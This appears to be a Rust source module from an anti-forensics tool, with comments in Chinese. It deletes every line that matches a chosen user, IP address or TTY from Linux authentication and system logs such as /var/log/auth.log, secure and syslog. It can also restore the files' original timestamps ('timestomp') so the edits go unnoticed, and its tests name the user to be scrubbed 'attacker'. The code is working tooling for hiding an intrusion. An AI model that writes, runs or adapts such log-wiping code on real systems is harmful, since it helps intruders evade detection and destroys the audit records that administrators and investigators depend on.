//! 文本日志行级过滤（auth.log / secure 等）

use crate::common::Context;
use std::fs;
use std::io::{self, BufRead, BufReader, Write};
use std::path::Path;

/// 行是否匹配选择性清除条件（多条件 AND）。
pub fn line_matches(line: &str, user: Option<&str>, ip: Option<&str>, tty: Option<&str>) -> bool {
    if user.is_none() && ip.is_none() && tty.is_none() {
        return false;
    }
    if let Some(u) = user {
        if !line_contains_user(line, u) {
            return false;
        }
    }
    if let Some(i) = ip {
        if !contains_ip(line, i) {
            return false;
        }
    }
    if let Some(t) = tty {
        if !line.contains(t) {
            return false;
        }
    }
    true
}

fn line_contains_user(line: &str, user: &str) -> bool {
    // sshd / sudo / login 常见格式，避免过宽子串误伤
    let patterns = [
        format!(" for {user} "),
        format!(" for {user}\t"),
        format!(" for {user}\r"),
        format!(" user {user} "),
        format!(" user={user}"),
        format!(" USER={user}"),
        format!("Invalid user {user} "),
        format!("invalid user {user} "),
        format!(" for invalid user {user} "),
        format!("session opened for user {user}"),
        format!("session closed for user {user}"),
        format!("Accepted password for {user} "),
        format!("Accepted publickey for {user} "),
        format!("Failed password for {user} "),
        format!("Failed password for invalid user {user} "),
        format!("sudo: {user} :"),
    ];
    if patterns.iter().any(|p| line.contains(p.as_str())) {
        return true;
    }
    // 行尾
    line.ends_with(&format!(" for {user}"))
        || line.ends_with(&format!(" user {user}"))
}

/// IP 匹配时避免 `10.0.0.1` 误中 `10.0.0.10`。
pub fn contains_ip(line: &str, ip: &str) -> bool {
    let bytes = line.as_bytes();
    let needle = ip.as_bytes();
    if needle.is_empty() {
        return false;
    }
    let mut start = 0;
    while start + needle.len() <= bytes.len() {
        if let Some(rel) = find_slice(&bytes[start..], needle) {
            let abs = start + rel;
            let before_ok = abs == 0 || !bytes[abs - 1].is_ascii_digit();
            let after = abs + needle.len();
            let after_ok = after >= bytes.len() || !bytes[after].is_ascii_digit();
            if before_ok && after_ok {
                return true;
            }
            start = abs + 1;
        } else {
            break;
        }
    }
    false
}

fn find_slice(hay: &[u8], needle: &[u8]) -> Option<usize> {
    hay.windows(needle.len()).position(|w| w == needle)
}

pub fn filter_log_file(
    ctx: &Context,
    path: &Path,
    user: Option<&str>,
    ip: Option<&str>,
    tty: Option<&str>,
) -> io::Result<u32> {
    if !path.exists() || !path.is_file() {
        return Ok(0);
    }

    let file = fs::File::open(path)?;
    let reader = BufReader::new(file);
    let mut kept = Vec::new();
    let mut removed = 0u32;

    for line in reader.lines() {
        let line = line?;
        if line_matches(&line, user, ip, tty) {
            removed += 1;
            if ctx.dry_run {
                let preview: String = line.chars().take(120).collect();
                println!("[预览] 移除 {} 行: {}", path.display(), preview);
                ctx.record_preview();
            }
        } else {
            kept.push(line);
        }
    }

    if removed == 0 {
        return Ok(0);
    }

    if ctx.dry_run {
        return Ok(removed);
    }

    let times = if ctx.timestomp {
        super::utmp::save_file_times(path)
    } else {
        None
    };

    // 写临时文件再 rename，降低写一半中断的风险
    let tmp = path.with_extension("coda_tmp");
    {
        let mut out = fs::File::create(&tmp)?;
        for line in &kept {
            writeln!(out, "{line}")?;
        }
        out.flush()?;
        let _ = out.sync_all();
    }

    fs::rename(&tmp, path).or_else(|_| -> io::Result<()> {
        fs::copy(&tmp, path)?;
        fs::remove_file(&tmp)?;
        Ok(())
    })?;

    if let Some(ref t) = times {
        super::utmp::restore_file_times(path, t);
    }

    println!(
        "[清除] {} — 移除 {} 行，保留 {} 行",
        path.display(),
        removed,
        kept.len()
    );
    ctx.record_ok();
    Ok(removed)
}

pub fn clean_auth_logs(ctx: &Context, user: Option<&str>, ip: Option<&str>, tty: Option<&str>) {
    ctx.info("过滤文本登录日志 (auth.log / secure / messages)...");

    let paths = [
        "/var/log/auth.log",
        "/var/log/auth.log.1",
        "/var/log/secure",
        "/var/log/secure.1",
        "/var/log/messages",
        "/var/log/messages.1",
        "/var/log/syslog",
        "/var/log/syslog.1",
    ];

    for p in &paths {
        let path = Path::new(p);
        if !path.exists() {
            continue;
        }
        match filter_log_file(ctx, path, user, ip, tty) {
            Ok(0) => ctx.info(&format!("{} — 没有匹配的行", path.display())),
            Ok(_) => {}
            Err(e) => {
                eprintln!("[失败] {} — {}", path.display(), e);
                ctx.record_fail();
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn user_match_sshd_formats() {
        assert!(line_matches(
            "sshd[1]: Accepted password for attacker from 1.2.3.4 port 22",
            Some("attacker"),
            None,
            None
        ));
        assert!(line_matches(
            "sshd[1]: Failed password for invalid user attacker from 1.2.3.4",
            Some("attacker"),
            None,
            None
        ));
        assert!(!line_matches(
            "sshd[1]: Accepted password for attack from 1.2.3.4 port 22",
            Some("attacker"),
            None,
            None
        ));
    }

    #[test]
    fn ip_boundary() {
        assert!(contains_ip("from 10.0.0.1 port 22", "10.0.0.1"));
        assert!(!contains_ip("from 10.0.0.10 port 22", "10.0.0.1"));
        assert!(contains_ip("rhost=192.168.1.100", "192.168.1.100"));
    }

    #[test]
    fn and_semantics() {
        let line = "sshd: Failed password for alice from 10.0.0.5 port 22 ssh2";
        assert!(line_matches(line, Some("alice"), Some("10.0.0.5"), None));
        assert!(!line_matches(line, Some("alice"), Some("10.0.0.6"), None));
        assert!(!line_matches(line, Some("bob"), Some("10.0.0.5"), None));
    }
}
